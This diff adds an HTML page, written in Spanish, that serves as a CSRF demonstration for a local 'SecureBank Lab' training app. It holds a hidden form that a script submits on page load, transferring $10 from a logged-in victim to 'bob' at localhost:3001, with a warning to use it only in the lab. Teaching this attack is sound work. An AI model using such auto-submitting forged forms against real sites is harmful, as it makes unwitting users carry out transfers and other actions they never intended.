@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>Demo CSRF · SecureBank Lab</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 560px; margin: 2rem auto; padding: 0 1rem; }
+    code { background: #eee; padding: 0.1rem 0.3rem; }
+    .warn { background: #fff3cd; padding: 0.75rem; border-radius: 6px; }
+  </style>
+</head>
+<body>
+  <h1>Página maliciosa (demo CSRF)</h1>
+  <p class="warn">Solo contra <code>http://localhost:3001</code> con sesión abierta de alice. No uses fuera del lab.</p>
+  <p>1. Entra en la app <strong>vulnerable</strong> como <code>alice</code>.<br>
+     2. Abre este archivo en el navegador.<br>
+     3. El formulario se envía solo y transfiere $10 a bob.</p>
+  <form id="csrf" action="http://localhost:3001/transfer" method="POST">
+    <input type="hidden" name="to" value="bob" />
+    <input type="hidden" name="amount" value="10" />
+    <input type="hidden" name="concept" value="CSRF demo" />
+  </form>
+  <script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
